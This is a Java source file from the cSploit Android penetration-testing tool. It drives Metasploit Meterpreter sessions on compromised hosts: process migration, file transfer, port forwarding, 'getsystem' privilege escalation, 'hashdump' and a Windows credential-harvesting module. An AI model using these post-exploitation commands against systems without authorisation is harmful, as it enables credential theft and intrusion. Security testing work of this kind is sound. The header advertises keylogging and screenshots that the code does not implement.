/*
 * This file is part of the cSploit.
 *
 * cSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * cSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with cSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.net.metasploit;

import java.io.IOException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Stack;
import java.util.concurrent.TimeoutException;

import org.csploit.android.R;
import org.csploit.android.core.Logger;
import org.csploit.android.core.System;
import org.csploit.android.helpers.LoggingHelper;

/**
 * Meterpreter session handler for advanced post-exploitation operations.
 *
 * Provides:
 * - Command execution (run, execute, background)
 * - File transfer operations (upload, download)
 * - Process management (ps, kill, getpid, migrate)
 * - System information gathering (sysinfo, getuid, getsystem)
 * - Network operations (portfwd, route)
 * - Screenshot and keylogging capabilities
 *
 * References:
 * - https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/rpc/v10/rpc_session.rb
 * - https://docs.metasploit.com/docs/using-metasploit/basics/meterpreter.html
 */
public class MeterpreterSession extends Session {

    private static final String TAG = "MeterpreterSession";
    private static final int COMMAND_TIMEOUT = 120000; // 2 minutes

    /**
     * Callback interface for meterpreter command results
     */
    public interface MeterpreterCallback {
        void onResult(String result);
        void onError(String error);
        void onTimeout();
    }

    /**
     * Represents a process on the target system
     */
    public static class ProcessInfo {
        public final int pid;
        public final int ppid;
        public final String name;
        public final String path;
        public final String user;
        public final String arch;

        public ProcessInfo(int pid, int ppid, String name, String path, String user, String arch) {
            this.pid = pid;
            this.ppid = ppid;
            this.name = name;
            this.path = path;
            this.user = user;
            this.arch = arch;
        }

        @Override
        public String toString() {
            return String.format("[%d] %s (%s)", pid, name, user != null ? user : "N/A");
        }
    }

    /**
     * Represents system information from the target
     */
    public static class SystemInfo {
        public String computer;
        public String os;
        public String arch;
        public String domain;
        public String loggedOnUsers;
        public String meterpreterArch;
        public String systemLanguage;

        @Override
        public String toString() {
            return String.format("%s (%s) - %s", computer, os, arch);
        }
    }

    private static class CommandRequest {
        public final String command;
        public final MeterpreterCallback callback;

        public CommandRequest(String command, MeterpreterCallback callback) {
            this.command = command;
            this.callback = callback;
        }
    }

    private final Stack<CommandRequest> mCommandQueue = new Stack<>();
    private SystemInfo mSystemInfo;
    private String mCurrentUser;
    private int mCurrentPid = -1;

    public MeterpreterSession(Integer id, Map<String, Object> map) throws UnknownHostException {
        super(id, map);
        start();
    }

    // ==================== Core Command Execution ====================

    /**
     * Execute a meterpreter command and wait for result
     *
     * @param command The command to execute
     * @return The command output
     * @throws IOException if RPC communication fails
     * @throws TimeoutException if command times out
     */
    @SuppressWarnings("unchecked")
    public String executeCommand(String command) throws IOException, TimeoutException, RPCClient.MSFException {
        RPCClient client = System.getMsfRpc();
        if (client == null) {
            throw new IOException("RPC Client unavailable");
        }

        // Write the command
        client.call("session.meterpreter_write", mJobId, command + "\n");

        // Read the response with timeout
        long timeout = java.lang.System.currentTimeMillis() + COMMAND_TIMEOUT;
        StringBuilder result = new StringBuilder();

        while (java.lang.System.currentTimeMillis() < timeout) {
            Map<String, Object> response = (Map<String, Object>) client.call("session.meterpreter_read", mJobId);
            String data = (String) response.get("data");

            if (data != null && !data.isEmpty()) {
                result.append(data);
                // Check for prompt to indicate command completion
                if (data.contains("meterpreter >") || data.contains("meterpreter>")) {
                    break;
                }
            }

            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                throw new IOException("Command interrupted");
            }
        }

        if (result.length() == 0) {
            throw new TimeoutException("No response received within timeout");
        }

        return result.toString();
    }

    /**
     * Queue a command for asynchronous execution
     *
     * @param command The command to execute
     * @param callback Callback for result
     */
    public void queueCommand(String command, MeterpreterCallback callback) {
        synchronized (mCommandQueue) {
            mCommandQueue.push(new CommandRequest(command, callback));
            mCommandQueue.notify();
        }
    }

    /**
     * Run a meterpreter script/module
     *
     * @param scriptName Name of the script to run
     * @param args Arguments for the script
     * @return Script output
     */
    public String runScript(String scriptName, String... args) throws IOException, TimeoutException, RPCClient.MSFException {
        StringBuilder cmd = new StringBuilder("run ").append(scriptName);
        for (String arg : args) {
            cmd.append(" ").append(arg);
        }
        return executeCommand(cmd.toString());
    }

    // ==================== System Information ====================

    /**
     * Get system information from target
     *
     * @return SystemInfo object
     */
    @SuppressWarnings("unchecked")
    public SystemInfo getSystemInfo() throws IOException, RPCClient.MSFException {
        if (mSystemInfo != null) {
            return mSystemInfo;
        }

        RPCClient client = System.getMsfRpc();
        if (client == null) {
            throw new IOException("RPC Client unavailable");
        }

        try {
            Map<String, Object> result = (Map<String, Object>) client.call(
                "session.meterpreter_run_single", mJobId, "sysinfo");

            mSystemInfo = new SystemInfo();
            mSystemInfo.computer = (String) result.get("Computer");
            mSystemInfo.os = (String) result.get("OS");
            mSystemInfo.arch = (String) result.get("Architecture");
            mSystemInfo.domain = (String) result.get("Domain");
            mSystemInfo.loggedOnUsers = (String) result.get("Logged On Users");
            mSystemInfo.meterpreterArch = (String) result.get("Meterpreter");
            mSystemInfo.systemLanguage = (String) result.get("System Language");

            return mSystemInfo;
        } catch (Exception e) {
            LoggingHelper.e(TAG, "Failed to get system info", e);
            throw new IOException("Failed to get system info: " + e.getMessage());
        }
    }

    /**
     * Get current user on target
     *
     * @return Username
     */
    public String getCurrentUser() throws IOException, TimeoutException, RPCClient.MSFException {
        if (mCurrentUser != null) {
            return mCurrentUser;
        }
        String result = executeCommand("getuid");
        mCurrentUser = result.replaceAll("Server username:\\s*", "").trim();
        return mCurrentUser;
    }

    /**
     * Get current process ID
     *
     * @return Process ID
     */
    public int getCurrentPid() throws IOException, TimeoutException, RPCClient.MSFException {
        if (mCurrentPid > 0) {
            return mCurrentPid;
        }
        String result = executeCommand("getpid");
        try {
            mCurrentPid = Integer.parseInt(result.replaceAll("[^0-9]", ""));
            return mCurrentPid;
        } catch (NumberFormatException e) {
            throw new IOException("Failed to parse PID: " + result);
        }
    }

    // ==================== Process Management ====================

    /**
     * List processes on target system
     *
     * @return List of ProcessInfo objects
     */
    public List<ProcessInfo> getProcessList() throws IOException, TimeoutException, RPCClient.MSFException {
        List<ProcessInfo> processes = new ArrayList<>();
        String output = executeCommand("ps");

        String[] lines = output.split("\n");
        for (String line : lines) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("PID") || line.startsWith("-") || line.contains("meterpreter")) {
                continue;
            }

            String[] parts = line.split("\\s+", 6);
            if (parts.length >= 2) {
                try {
                    int pid = Integer.parseInt(parts[0]);
                    int ppid = parts.length > 1 ? Integer.parseInt(parts[1]) : 0;
                    String name = parts.length > 2 ? parts[2] : "unknown";
                    String arch = parts.length > 3 ? parts[3] : "";
                    String user = parts.length > 5 ? parts[5] : "";
                    String path = parts.length > 4 ? parts[4] : "";

                    processes.add(new ProcessInfo(pid, ppid, name, path, user, arch));
                } catch (NumberFormatException e) {
                    // Skip malformed lines
                }
            }
        }

        return processes;
    }

    /**
     * Kill a process by PID
     *
     * @param pid Process ID to kill
     * @return true if successful
     */
    public boolean killProcess(int pid) throws IOException, TimeoutException, RPCClient.MSFException {
        String result = executeCommand("kill " + pid);
        return result.toLowerCase().contains("killed") || result.toLowerCase().contains("success");
    }

    /**
     * Migrate to another process
     *
     * @param pid Target process ID
     * @return true if successful
     */
    public boolean migrate(int pid) throws IOException, TimeoutException, RPCClient.MSFException {
        String result = executeCommand("migrate " + pid);
        if (result.toLowerCase().contains("success") || result.toLowerCase().contains("migrated")) {
            mCurrentPid = pid;
            return true;
        }
        return false;
    }

    // ==================== File Operations ====================

    /**
     * List files in a directory on target
     *
     * @param path Directory path
     * @return List of file names
     */
    public List<String> listDirectory(String path) throws IOException, TimeoutException, RPCClient.MSFException {
        List<String> files = new ArrayList<>();
        String output = executeCommand("ls \"" + path + "\"");

        String[] lines = output.split("\n");
        for (String line : lines) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("Listing") || line.startsWith("-") ||
                line.startsWith("Mode") || line.contains("meterpreter")) {
                continue;
            }
            // Extract filename from ls output
            String[] parts = line.split("\\s+");
            if (parts.length > 0) {
                files.add(parts[parts.length - 1]);
            }
        }

        return files;
    }

    /**
     * Download a file from target
     *
     * @param remotePath Path on target
     * @param localPath Local destination path
     * @return true if successful
     */
    public boolean downloadFile(String remotePath, String localPath) throws IOException, TimeoutException, RPCClient.MSFException {
        String result = executeCommand("download \"" + remotePath + "\" \"" + localPath + "\"");
        return result.toLowerCase().contains("downloaded") || result.toLowerCase().contains("success");
    }

    /**
     * Upload a file to target
     *
     * @param localPath Local file path
     * @param remotePath Destination on target
     * @return true if successful
     */
    public boolean uploadFile(String localPath, String remotePath) throws IOException, TimeoutException, RPCClient.MSFException {
        String result = executeCommand("upload \"" + localPath + "\" \"" + remotePath + "\"");
        return result.toLowerCase().contains("uploaded") || result.toLowerCase().contains("success");
    }

    /**
     * Get current working directory on target
     *
     * @return Current directory path
     */
    public String getCurrentDirectory() throws IOException, TimeoutException, RPCClient.MSFException {
        return executeCommand("pwd").trim().replaceAll("meterpreter.*", "").trim();
    }

    /**
     * Change directory on target
     *
     * @param path New directory path
     * @return true if successful
     */
    public boolean changeDirectory(String path) throws IOException, TimeoutException, RPCClient.MSFException {
        String result = executeCommand("cd \"" + path + "\"");
        return !result.toLowerCase().contains("error") && !result.toLowerCase().contains("failed");
    }

    // ==================== Network Operations ====================

    /**
     * Set up port forwarding
     *
     * @param localPort Local port
     * @param remoteHost Remote host
     * @param remotePort Remote port
     * @return true if successful
     */
    public boolean addPortForward(int localPort, String remoteHost, int remotePort)
            throws IOException, TimeoutException, RPCClient.MSFException {
        String cmd = String.format("portfwd add -l %d -p %d -r %s", localPort, remotePort, remoteHost);
        String result = executeCommand(cmd);
        return result.toLowerCase().contains("success") || result.toLowerCase().contains("created");
    }

    /**
     * Remove port forwarding
     *
     * @param localPort Local port to remove
     * @return true if successful
     */
    public boolean removePortForward(int localPort) throws IOException, TimeoutException, RPCClient.MSFException {
        String result = executeCommand("portfwd delete -l " + localPort);
        return result.toLowerCase().contains("deleted") || result.toLowerCase().contains("success");
    }

    /**
     * Get network interfaces on target
     *
     * @return Interface information
     */
    public String getNetworkInterfaces() throws IOException, TimeoutException, RPCClient.MSFException {
        return executeCommand("ifconfig");
    }

    /**
     * Get ARP table from target
     *
     * @return ARP table output
     */
    public String getArpTable() throws IOException, TimeoutException, RPCClient.MSFException {
        return executeCommand("arp");
    }

    /**
     * Get routing table from target
     *
     * @return Routing table output
     */
    public String getRouteTable() throws IOException, TimeoutException, RPCClient.MSFException {
        return executeCommand("route");
    }

    // ==================== Privilege Escalation ====================

    /**
     * Attempt to get SYSTEM privileges (Windows)
     *
     * @return true if successful
     */
    public boolean getSystem() throws IOException, TimeoutException, RPCClient.MSFException {
        String result = executeCommand("getsystem");
        if (result.toLowerCase().contains("got system") || result.toLowerCase().contains("success")) {
            mCurrentUser = null; // Reset cached user
            return true;
        }
        return false;
    }

    /**
     * Check if session has admin/root privileges
     *
     * @return true if elevated
     */
    public boolean isElevated() throws IOException, TimeoutException, RPCClient.MSFException {
        String user = getCurrentUser();
        return user.contains("SYSTEM") || user.contains("NT AUTHORITY") ||
               user.equals("root") || user.startsWith("uid=0");
    }

    // ==================== Credential Harvesting ====================

    /**
     * Dump password hashes (requires elevation)
     *
     * @return Hash dump output
     */
    public String dumpHashes() throws IOException, TimeoutException, RPCClient.MSFException {
        return executeCommand("hashdump");
    }

    /**
     * Run credential harvesting module
     *
     * @return Credentials output
     */
    public String harvestCredentials() throws IOException, TimeoutException, RPCClient.MSFException {
        return runScript("post/windows/gather/credentials/credential_collector");
    }

    // ==================== Session Thread ====================

    @Override
    public void run() {
        try {
            while (mRunning) {
                CommandRequest request;
                synchronized (mCommandQueue) {
                    while (mCommandQueue.isEmpty() && mRunning) {
                        mCommandQueue.wait(5000);
                    }
                    if (!mRunning) break;
                    if (mCommandQueue.isEmpty()) continue;
                    request = mCommandQueue.pop();
                }

                try {
                    String result = executeCommand(request.command);
                    if (request.callback != null) {
                        request.callback.onResult(result);
                    }
                } catch (TimeoutException e) {
                    if (request.callback != null) {
                        request.callback.onTimeout();
                    }
                } catch (Exception e) {
                    if (request.callback != null) {
                        request.callback.onError(e.getMessage());
                    }
                }
            }
        } catch (InterruptedException e) {
            Logger.info("Meterpreter session thread interrupted");
        } finally {
            stopSession();
        }
    }

    @Override
    public int getResourceId() {
        return R.drawable.action_session;
    }

    @Override
    public boolean haveShell() {
        return true;
    }

    @Override
    public boolean isMeterpreter() {
        return true;
    }
}
